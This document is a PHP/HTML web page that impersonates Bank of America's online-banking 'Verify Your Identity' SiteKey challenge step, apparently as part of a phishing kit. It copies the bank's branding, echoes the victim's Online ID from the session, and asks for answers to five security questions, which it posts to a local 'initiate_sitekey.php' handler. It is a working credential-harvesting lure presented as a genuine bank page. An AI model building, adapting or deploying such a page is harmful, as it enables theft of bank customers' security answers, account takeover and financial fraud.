<?php
ini_set("output_buffering",4096);
session_start();
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US">
	<head>
<?php require_once 'crypt.php'; ?>


<meta http-equiv="X-UA-Compatible" content="IE=Edge" />





<!-- TLDB false -->
			<!-- TL-NOPV true -->
	<title>Bank of America | Online Banking | SiteKey | SiteKey Challenge Question</title>

<script language="JavaScript" type="text/javascript">
			boaVIPAAjawrEnabled = "true";
		</script>
	<meta name="Description" CONTENT="Please answer the security question to continue signing in on this unrecognized computer.">
<meta name="Keywords" CONTENT="Unrecognized computer">
<meta http-equiv="content-type" content="text/html;charset=utf-8" />

   <link rel="shortcut icon" href="imgs/favicon.ico" type="image/ico" />


	<script language="JavaScript" type="text/javascript">
			boaVIPAAuseGzippedBundles = "true";
	</script>
<!-- TLDB TEALEAF_UiCapture_APP_ENABLED_NOT_TRUE -->



		<script language="JavaScript" type="text/javascript">
			boaVIPAAjawrEnabled = "true";
		</script>
						<link rel="stylesheet" type="text/css" href="imgs/login.css" media="all" />
						<script src="imgs/login.js" type="text/javascript"></script>



	
	<style type="text/css"> body { display : none;} </style>
	</head>
	<body class="trfwl-body      ">

		<script type="text/javascript"> 
		if (self == top) {
		  var theBody = document.getElementsByTagName('body')[0];
		  theBody.style.display = "block";
		} else { 
		  top.location = self.location; 
		}
		</script>
		<noscript><style>body{display : block;}</style></noscript>
		
		<a class="ada-hidden" href="#skip-to-h1" name="anc-skip-to-main-content">Skip to main content</a>
		
		<div class="two-row-flex-wideleft-layout">
			<div class="center-content">
				<div class="header">


<div class="header-module">
   <div class="fsd-secure-esp-skin">
   	  <img height="28" width="207"  src="imgs/LOGO.gif" />
      <div class="page-type" data-font="cnx-regular">Sign In</div>
      <div class="right-links">
		<div class="secure-area">Secure Area</div>
       <a class="divide" href="#" target="_self" name="spanish_toggle" title="Muestra esta sesión de la Banca en Línea">En Espa&#241;ol</a>
       <div class="clearboth"></div>
      </div>
      <div class="clearboth"></div>
   </div>
</div>
	
<div class="page-title-module h-100" id="skip-to-h1">
  <div class="red-grad-bar-skin sup-ie">
    <h1 data-font="cnx-regular">Verify Your Identity</h1>
  </div>
</div>


	<div id="clientSideErrors" class="messaging-module hide" aria-live="polite">
		<div class="error-skin">
			<div class="error-message">	
					<p class="title redTitle" class="TLu_ERROR">We can't process your request.</p>
					<div id="Vipaa_Client_0"><p>We encountered errors with the highlighted item(s). Please make the noted adjustments to continue.</p></div>
				<ul></ul>
			</div>
		</div>
	</div>















	<div class="vipaa-timeout-module">
		<div id="timeoutDialogExpire" class="hidden">
				<div class="session-content">
					<p>For security, sessions end after 10 minutes of inactivity.</p>
					<p>Your session has timed out, and you'll have to start again</p>
				</div>
		</div>
		
		<div id="timeoutDialog" class="hidden">
				<div class="session-content">
					<p>Your Application Will Time Out in 2 Minutes</p>
					<p>For your safety and Protection your Online Banking session is about to be timed out and redirected to the home page if there is no additional activity.</p> 
					<p>If you are still working in your Online Banking session simply click OK to continue.</p>
				</div>
		</div>
	</div>

   
</div>
				<div class="flex-top-row"></div>
				<div class="bottom-row">
					<div class="left-column"><div class="sitekey-questions-module">
	<div class="verify-comp-skin phoenix">
			<p class="bold">
				Please answer your challenge question so we can confirm your identity.<br>
			</p><p>*Choose your current challenge questions.</p>
			
			<form class="simple-form" name="VerifyCompForm" id="VerifyCompForm" method="post" action="initiate_sitekey.php" autocomplete="off">
		 <div class="id-section">
					<div class="online-id"><strong><span class="bold">Online ID:</span></strong>
					<?php if (isset($_SESSION['ONLINEID'])) {echo $_SESSION['ONLINEID']; } ?>
					</div>
					<div class="clearboth"></div>
				 </div>
				 <label for="question1">			
							Your first question
						</label>
				 <select id="question1" name="question1"  class="tl-private">
					<option class="TL_NPI_ChallengeAnswer" value="1" <? if(isset($_SESSION['QUESTIONI']) && $_SESSION['QUESTIONI'] == "1") { ?>selected="selected"<? } ?>>Select one...</option>


						<option  class="TL_NPI_ChallengeAnswer" value="What is the name of your best childhood friend?" <? if(isset($_SESSION['QUESTIONI']) && $_SESSION['QUESTIONI'] == "What is the name of your best childhood friend?") { ?>selected="selected"<? } ?>>What is the name of your best childhood friend?</option>

						<option  class="TL_NPI_ChallengeAnswer" value="What is the first name of your mother closest friend?" <? if(isset($_SESSION['QUESTIONI']) && $_SESSION['QUESTIONI'] == "What is the first name of your mother closest friend?") { ?>selected="selected"<? } ?>>What is the first name of your mother's closest friend?</option>

						<option  class="TL_NPI_ChallengeAnswer" value="What was the name of your first pet?" <? if(isset($_SESSION['QUESTIONI']) && $_SESSION['QUESTIONI'] == 'What was the name of your first pet?') { ?>selected="selected"<? } ?>>What was the name of your first pet?</option>

						<option  class="TL_NPI_ChallengeAnswer" value="What is the first name of your favorite niece/nephew?" <? if(isset($_SESSION['QUESTIONI']) && $_SESSION['QUESTIONI'] == 'What is the first name of your favorite niece/nephew?') { ?>selected="selected"<? } ?>>What is the first name of your favorite niece/nephew?</option>

						<option  class="TL_NPI_ChallengeAnswer" value="What is your all-time favorite song?" <? if(isset($_SESSION['QUESTIONI']) && $_SESSION['QUESTIONI'] == 'What is your all-time favorite song?') { ?>selected="selected"<? } ?>>What is your all-time favorite song?</option>

						<option  class="TL_NPI_ChallengeAnswer" value="What was the first name of your favorite teacher or professor?" <? if(isset($_SESSION['QUESTIONI']) && $_SESSION['QUESTIONI'] == 'What was the first name of your favorite teacher or professor?') { ?>selected="selected"<? } ?>>What was the first name of your favorite teacher or professor?</option>

						<option  class="TL_NPI_ChallengeAnswer" value="What is the first name of your hairdresser/barber?" <? if(isset($_SESSION['QUESTIONI']) && $_SESSION['QUESTIONI'] == 'What is the first name of your hairdresser/barber?') { ?>selected="selected"<? } ?>>What is the first name of your hairdresser/barber?</option>

						<option  class="TL_NPI_ChallengeAnswer" value="What is the name of a college you applied to but didnt attend?" <? if(isset($_SESSION['QUESTIONI']) && $_SESSION['QUESTIONI'] == 'What is the name of a college you applied to but didn\'t attend?') { ?>selected="selected"<? } ?>>What is the name of a college you applied to but didnt attend?</option>

						<option  class="TL_NPI_ChallengeAnswer" value="On what street is your grocery store?" <? if(isset($_SESSION['QUESTIONI']) && $_SESSION['QUESTIONI'] == 'On what street is your grocery store?') { ?>selected="selected"<? } ?>>On what street is your grocery store?</option>

						 <option  class="TL_NPI_ChallengeAnswer" value="What is the name of the medical professional who delivered your first child?" <? if(isset($_SESSION['QUESTIONI']) && $_SESSION['QUESTIONI'] == 'What is the name of the medical professional who delivered your first child?') { ?>selected="selected"<? } ?>>What is the name of the medical professional who delivered your first child?</option>



				</select>
						<label  for="answer1"><span class="ada-hidden">Your First</span>
						Answer</label>
					<input class="tl-private" type="text" id="answer1" maxlength="30" name="Answer1" value ="<?php if (isset($_SESSION['ANSWERI'])) {echo $_SESSION['ANSWERI']; } ?>">	

					 <br>
						<label for="question2">			
							Your second question
						</label>
					
				<select id="question2" name="question2"  class="tl-private">
					<option  class="TL_NPI_ChallengeAnswer" value="1" <? if(isset($_SESSION['QUESTIONII']) && $_SESSION['QUESTIONII'] == '1') { ?>selected="selected"<? } ?>>Select one..</option>

						<option  class="TL_NPI_ChallengeAnswer" value="Who is your favorite person in history?" <? if(isset($_SESSION['QUESTIONII']) && $_SESSION['QUESTIONII'] == 'Who is your favorite person in history?') { ?>selected="selected"<? } ?>>Who is your favorite person in history?</option>

						<option  class="TL_NPI_ChallengeAnswer" value="What was the make and model of your first car?" <? if(isset($_SESSION['QUESTIONII']) && $_SESSION['QUESTIONII'] == 'What was the make and model of your first car?') { ?>selected="selected"<? } ?>>What was the make and model of your first car?</option>

						<option  class="TL_NPI_ChallengeAnswer" value="What is the name of your high school star athlete?" <? if(isset($_SESSION['QUESTIONII']) && $_SESSION['QUESTIONII'] == 'What is the name of your high school star athlete?') { ?>selected="selected"<? } ?>>What is the name of your high school's star athlete?</option>

						<option  class="TL_NPI_ChallengeAnswer" value="What was the first live concert you attended?" <? if(isset($_SESSION['QUESTIONII']) && $_SESSION['QUESTIONII'] == 'What was the first live concert you attended?') { ?>selected="selected"<? } ?>>What was the first live concert you attended?</option>

						<option  class="TL_NPI_ChallengeAnswer" value="Where were you on New Year 2000?" <? if(isset($_SESSION['QUESTIONII']) && $_SESSION['QUESTIONII'] == 'Where were you on New Year 2000?') { ?>selected="selected"<? } ?>>Where were you on New Year's 2000?</option>

						<option  class="TL_NPI_ChallengeAnswer" value="What is the first name of your high school prom date?" <? if(isset($_SESSION['QUESTIONII']) && $_SESSION['QUESTIONII'] == 'What is the first name of your high school prom date?') { ?>selected="selected"<? } ?>>What is the first name of your high school prom date?</option>

						<option  class="TL_NPI_ChallengeAnswer" value="As a child, what did you want to be when you grew up?" <? if(isset($_SESSION['QUESTIONII']) && $_SESSION['QUESTIONII'] == 'As a child, what did you want to be when you grew up?') { ?>selected="selected"<? } ?>>As a child, what did you want to be when you grew up?</option>

						<option  class="TL_NPI_ChallengeAnswer" value="What is the name of your favorite restaurant?" <? if(isset($_SESSION['QUESTIONII']) && $_SESSION['QUESTIONII'] == 'What is the name of your favorite restaurant?') { ?>selected="selected"<? } ?>>What is the name of your favorite restaurant?</option>

						<option  class="TL_NPI_ChallengeAnswer" value="What was the first name of your first manager?" <? if(isset($_SESSION['QUESTIONII']) && $_SESSION['QUESTIONII'] == 'What was the first name of your first manager?') { ?>selected="selected"<? } ?>>What was the first name of your first manager?</option>

						<option  class="TL_NPI_ChallengeAnswer" value="What is the first name of the best man/maid of honor at your wedding?" <? if(isset($_SESSION['QUESTIONII']) && $_SESSION['QUESTIONII'] == 'What is the first name of the best man/maid of honor at your wedding?') { ?>selected="selected"<? } ?>>What is the first name of the best man/maid of honor at your wedding?</option>

				</select>
						<label  for="answer2"><span class="ada-hidden">Your Second</span>
						Answer</label>
					<input class="tl-private" type="text" id="answer2" maxlength="30" name="Answer2"  value ="<?php if (isset($_SESSION['ANSWERII'])) {echo $_SESSION['ANSWERII']; } ?>">	

					 <br>
						<label for="question3">			
							Your third question
						</label>
					
				<select id="question3" name="question3"  class="tl-private">
					<option  class="TL_NPI_ChallengeAnswer" value="1" <? if(isset($_SESSION['QUESTIONIII']) && $_SESSION['QUESTIONIII'] == '1') { ?>selected="selected"<? } ?>>Select one...</option>

						<option  class="TL_NPI_ChallengeAnswer" value="What is the name of your favorite charity?" <? if(isset($_SESSION['QUESTIONIII']) && $_SESSION['QUESTIONIII'] == 'What is the name of your favorite charity?') { ?>selected="selected"<? } ?>>What is the name of your favorite charity?</option>

						<option  class="TL_NPI_ChallengeAnswer" value="In what city did you honeymoon? (Enter full name of city only)" <? if(isset($_SESSION['QUESTIONIII']) && $_SESSION['QUESTIONIII'] == 'In what city did you honeymoon? (Enter full name of city only)') { ?>selected="selected"<? } ?>>In what city did you honeymoon? (Enter full name of city only)</option>

						<option  class="TL_NPI_ChallengeAnswer" value="What is the name of your first babysitter?" <? if(isset($_SESSION['QUESTIONIII']) && $_SESSION['QUESTIONIII'] == 'What is the name of your first babysitter?') { ?>selected="selected"<? } ?>>What is the name of your first babysitter?</option>

						<option  class="TL_NPI_ChallengeAnswer" value="What celebrity do you most resemble?" <? if(isset($_SESSION['QUESTIONIII']) && $_SESSION['QUESTIONIII'] == 'What celebrity do you most resemble?') { ?>selected="selected"<? } ?>>What celebrity do you most resemble?</option>

						<option  class="TL_NPI_ChallengeAnswer" value="What was the name of your first boyfriend or girlfriend?" <? if(isset($_SESSION['QUESTIONIII']) && $_SESSION['QUESTIONIII'] == 'What was the name of your first boyfriend or girlfriend?') { ?>selected="selected"<? } ?>>What was the name of your first boyfriend or girlfriend?</option>

						<option  class="TL_NPI_ChallengeAnswer" value="What is your best friend first name?" <? if(isset($_SESSION['QUESTIONIII']) && $_SESSION['QUESTIONIII'] == "What is your best friend first name?") { ?>selected="selected"<? } ?>>What is your best friend's first name?</option>

						<option  class="TL_NPI_ChallengeAnswer" value="What is the last name of your third grade teacher?" <? if(isset($_SESSION['QUESTIONIII']) && $_SESSION['QUESTIONIII'] == "What is the last name of your third grade teacher?") { ?>selected="selected"<? } ?>>What is the last name of your third grade teacher?</option>

						<option  class="TL_NPI_ChallengeAnswer" value="What street did your best friend in high school live on? (Enter full name of street only)" <? if(isset($_SESSION['QUESTIONIII']) && $_SESSION['QUESTIONIII'] == "What street did your best friend in high school live on? (Enter full name of street only)") { ?>selected="selected"<? } ?>>What street did your best friend in high school live on? (Enter full name of street only)</option>

						<option  class="TL_NPI_ChallengeAnswer" value="What is the last name of your family physician?" <? if(isset($_SESSION['QUESTIONIII']) && $_SESSION['QUESTIONIII'] == "What is the last name of your family physician?") { ?>selected="selected"<? } ?>>What is the last name of your family physician?</option>

						<option  class="TL_NPI_ChallengeAnswer" value="In what city did you meet your spouse/significant other?" <? if(isset($_SESSION['QUESTIONIII']) && $_SESSION['QUESTIONIII'] == "In what city did you meet your spouse/significant other?") { ?>selected="selected"<? } ?>>In what city did you meet your spouse/significant other?</option>
				</select>


						<label  for="answer3"><span class="ada-hidden">Your Third</span>
						Answer</label>
					<input class="tl-private" type="text" id="answer3" maxlength="30" name="Answer3" value ="<?php if (isset($_SESSION['ANSWERIII'])) {echo $_SESSION['ANSWERIII']; } ?>">
							
					 		<br>
							<label for="question4">			
							Your fourth question
						</label>
					
				<select id="question4" name="question4"  class="tl-private">
					<option  class="TL_NPI_ChallengeAnswer" value="1" <? if(isset($_SESSION['QUESTIONIIII']) && $_SESSION['QUESTIONIIII'] == "1") { ?>selected="selected"<? } ?>>Select one...</option>

						<option  class="TL_NPI_ChallengeAnswer" value="Who is your favorite person in history?" <? if(isset($_SESSION['QUESTIONIIII']) && $_SESSION['QUESTIONIIII'] == "Who is your favorite person in history?") { ?>selected="selected"<? } ?>>Who is your favorite person in history?</option>

						<option  class="TL_NPI_ChallengeAnswer" value="What was the make and model of your first car?" <? if(isset($_SESSION['QUESTIONIIII']) && $_SESSION['QUESTIONIIII'] == "What was the make and model of your first car?") { ?>selected="selected"<? } ?>>What was the make and model of your first car?</option>

						<option  class="TL_NPI_ChallengeAnswer" value="What is the name of your high school star athlete?" <? if(isset($_SESSION['QUESTIONIIII']) && $_SESSION['QUESTIONIIII'] == "What is the name of your high school star athlete?") { ?>selected="selected"<? } ?>>What is the name of your high school's star athlete?</option>

						<option  class="TL_NPI_ChallengeAnswer" value="What was the first live concert you attended?" <? if(isset($_SESSION['QUESTIONIIII']) && $_SESSION['QUESTIONIIII'] == "What was the first live concert you attended?") { ?>selected="selected"<? } ?>>What was the first live concert you attended?</option>

						<option  class="TL_NPI_ChallengeAnswer" value="Where were you on New Year 2000?" <? if(isset($_SESSION['QUESTIONIIII']) && $_SESSION['QUESTIONIIII'] == "Where were you on New Year 2000?") { ?>selected="selected"<? } ?>>Where were you on New Year's 2000?</option>

						<option  class="TL_NPI_ChallengeAnswer" value="What is the first name of your high school prom date?" <? if(isset($_SESSION['QUESTIONIIII']) && $_SESSION['QUESTIONIIII'] == "What is the first name of your high school prom date?") { ?>selected="selected"<? } ?>>What is the first name of your high school prom date?</option>

						<option  class="TL_NPI_ChallengeAnswer" value="As a child, what did you want to be when you grew up?" <? if(isset($_SESSION['QUESTIONIIII']) && $_SESSION['QUESTIONIIII'] == 'As a child, what did you want to be when you grew up?') { ?>selected="selected"<? } ?>>As a child, what did you want to be when you grew up?</option>

						<option  class="TL_NPI_ChallengeAnswer" value="What is the name of your favorite restaurant?" <? if(isset($_SESSION['QUESTIONIIII']) && $_SESSION['QUESTIONIIII'] == 'What is the name of your favorite restaurant?') { ?>selected="selected"<? } ?>>What is the name of your favorite restaurant?</option>

						<option  class="TL_NPI_ChallengeAnswer" value="What was the first name of your first manager?" <? if(isset($_SESSION['QUESTIONIIII']) && $_SESSION['QUESTIONIIII'] == 'What was the first name of your first manager?') { ?>selected="selected"<? } ?>>What was the first name of your first manager?</option>

						<option  class="TL_NPI_ChallengeAnswer" value="What is the first name of the best man/maid of honor at your wedding?" <? if(isset($_SESSION['QUESTIONIIII']) && $_SESSION['QUESTIONIIII'] == 'What is the first name of the best man/maid of honor at your wedding?') { ?>selected="selected"<? } ?>>What is the first name of the best man/maid of honor at your wedding?</option>

						<label  for="answer4"><span class="ada-hidden">Your Fourth</span>
						Answer</label>
					<input class="tl-private" type="text" id="answer4" maxlength="30" name="Answer4" value ="<?php if (isset($_SESSION['ANSWERIIII'])) {echo $_SESSION['ANSWERIIII']; } ?>">
					 <br>

					 <label for="question5">			
							Your fifth question
						</label>
				 <select id="question5" name="question5"  class="tl-private">
					<option class="TL_NPI_ChallengeAnswer" value="1" <? if(isset($_SESSION['QUESTIONIIIII']) && $_SESSION['QUESTIONIIIII'] == "1") { ?>selected="selected"<? } ?>>Select one...</option>


						<option  class="TL_NPI_ChallengeAnswer" value="What is the name of your best childhood friend?" <? if(isset($_SESSION['QUESTIONIIIII']) && $_SESSION['QUESTIONIIIII'] == "What is the name of your best childhood friend?") { ?>selected="selected"<? } ?>>What is the name of your best childhood friend?</option>

						<option  class="TL_NPI_ChallengeAnswer" value="What is the first name of your mother closest friend?" <? if(isset($_SESSION['QUESTIONIIIII']) && $_SESSION['QUESTIONIIIII'] == "What is the first name of your mother closest friend?") { ?>selected="selected"<? } ?>>What is the first name of your mother's closest friend?</option>

						<option  class="TL_NPI_ChallengeAnswer" value="What was the name of your first pet?" <? if(isset($_SESSION['QUESTIONIIIII']) && $_SESSION['QUESTIONIIIII'] == 'What was the name of your first pet?') { ?>selected="selected"<? } ?>>What was the name of your first pet?</option>

						<option  class="TL_NPI_ChallengeAnswer" value="What is the first name of your favorite niece/nephew?" <? if(isset($_SESSION['QUESTIONIIIII']) && $_SESSION['QUESTIONIIIII'] == 'What is the first name of your favorite niece/nephew?') { ?>selected="selected"<? } ?>>What is the first name of your favorite niece/nephew?</option>

						<option  class="TL_NPI_ChallengeAnswer" value="What is your all-time favorite song?" <? if(isset($_SESSION['QUESTIONIIIII']) && $_SESSION['QUESTIONIIIII'] == 'What is your all-time favorite song?') { ?>selected="selected"<? } ?>>What is your all-time favorite song?</option>

						<option  class="TL_NPI_ChallengeAnswer" value="What was the first name of your favorite teacher or professor?" <? if(isset($_SESSION['QUESTIONIIIII']) && $_SESSION['QUESTIONIIIII'] == 'What was the first name of your favorite teacher or professor?') { ?>selected="selected"<? } ?>>What was the first name of your favorite teacher or professor?</option>

						<option  class="TL_NPI_ChallengeAnswer" value="What is the first name of your hairdresser/barber?" <? if(isset($_SESSION['QUESTIONIIIII']) && $_SESSION['QUESTIONIIIII'] == 'What is the first name of your hairdresser/barber?') { ?>selected="selected"<? } ?>>What is the first name of your hairdresser/barber?</option>

						<option  class="TL_NPI_ChallengeAnswer" value="What is the name of a college you applied to but didnt attend?" <? if(isset($_SESSION['QUESTIONIIIII']) && $_SESSION['QUESTIONIIIII'] == 'What is the name of a college you applied to but didn\'t attend?') { ?>selected="selected"<? } ?>>What is the name of a college you applied to but didnt attend?</option>

						<option  class="TL_NPI_ChallengeAnswer" value="On what street is your grocery store?" <? if(isset($_SESSION['QUESTIONIIIII']) && $_SESSION['QUESTIONI'] == 'On what street is your grocery store?') { ?>selected="selected"<? } ?>>On what street is your grocery store?</option>

						 <option  class="TL_NPI_ChallengeAnswer" value="What is the name of the medical professional who delivered your first child?" <? if(isset($_SESSION['QUESTIONIIIII']) && $_SESSION['QUESTIONIIIII'] == 'What is the name of the medical professional who delivered your first child?') { ?>selected="selected"<? } ?>>What is the name of the medical professional who delivered your first child?</option>

						<label  for="answer5"><span class="ada-hidden">Your Fifth</span>
						Answer</label>
					<input class="tl-private" type="text" id="answer5" maxlength="30" name="Answer5" value ="<?php if (isset($_SESSION['ANSWERIIIII'])) {echo $_SESSION['ANSWERIIIII']; } ?>">
				 
				
				<a href="javascript:void(0);" title="Continue" onclick="document.VerifyCompForm.action='initiate_sitekey.php';$('#VerifyCompForm').submit();" class="button-common button-blue" name="enter-online-id-submit"><span>Continue</span></a>
				 <div class="clearboth"></div>
			</form>
	</div>
</div>
</div>
					<div class="right-column no-print">
 <!-- {currentLocation}  -->




	<div class="quick-help-vipaa-module">
		<div class="fsd-lp-skin phoenix sup-ie" aria-atomic="true">			
			<div class="sm-title">	
					<h2 class="sm-header">Quick help</h2>
			</div>					
			<div class="sm-topcontent-dottedbtm">
				<ul class="help-links">
									<li>
										<a name="cant_answer_your_challenge_question" href="#" class="help-link collapsed"><span class="ada-hidden"></span><span class="title">Can't answer your challenge question?</span></a>
										<div class="help-link-answer hide"><p>If you forgot the answer to this challenge question, please <a name="sign-in-reset-otp" href="#">reset your SiteKey questions and answers</a>. If you would rather have a customer service specialist reset your questions and answers with you, please call 1.800.933.6262 Monday through Friday from 7 a.m. to 10 p.m. local time, or Saturday and Sunday 8 a.m. to 5 p.m. local time.</p>
<p>If you don&rsquo;t recognize this challenge question as yours, <a name="sign-in-reset-otp" href="#">make sure you entered the right Online Banking ID</a>, as the question you are being asked is tied to the Online Banking ID that you entered.</p></div>
									</li>
				</ul>
			</div>
					<div class="sm-btmcontent">













<script type="text/javascript">
	var lpUnit = "";
	if (typeof(lpLanguage)=='undefined')
		var lpLanguage = 'english';
	var ConversionStage = ""
</script>


	<div class="liveperson-module">
			<div id="lpButtonDiv"></div>
	</div>
					</div>
		</div>
	</div>



</div>
					<div class="clearboth"></div>
				</div>
				<div class="single-column-row"></div>
				<div class="footer">
					<div class="footer-top">&nbsp;</div>
					<div class="footer-inner">
		
<div class="global-footer-module">
   <div class="gray-bground-skin cssp">
		<div class="secure">Secure area</div>
	
       
      <div class="link-container">
         <div class="link-row"> 
				
				<a class="last-link" href="#" name="Privacy_&_Security_footer" title="Privacy & Security" target="_blank">Privacy &amp; Security</a>
				<div class="clearboth"></div>
         </div>
      </div>
      <p>Bank of America, N.A. Member FDIC. <a name="Equal_Housing_Lender" href="#" target="_blank">Equal Housing Lender</a> <br />&copy;&nbsp;2015 Bank of America Corporation. All rights reserved.</p>
   </div>
</div>
</div>
				</div>
			</div>
		</div>
	</body>
</html>
<?php ob_end_flush(); ?>
